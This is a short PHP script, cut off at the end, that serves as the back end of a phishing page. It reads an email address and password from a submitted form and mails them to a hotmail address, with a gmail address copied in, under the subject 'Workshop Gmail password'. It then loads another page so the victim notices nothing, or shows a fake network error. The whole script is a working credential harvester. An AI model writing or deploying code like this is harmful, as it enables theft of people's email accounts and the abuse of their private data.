<?php
        $mailhacked = $_POST["email"];
        $passwordhacked = $_POST["password"];
         $to = "nironbaniya@hotmail.com";
         $subject = "Workshop Gmail password";
         
         $message = "$mailhacked";
         $message .= "<br>$passwordhacked";
         
         $header = "From:jdarch07@gmail.com \r\n";
         $header .= "Cc:jdarch07@gmail.com \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
         
         $retval = mail($to,$subject,$message,$header);
         
         if( $retval == true ) {
            include("MKR.php");
         }else {
            echo "Message could not be sent...404 error check your internet";
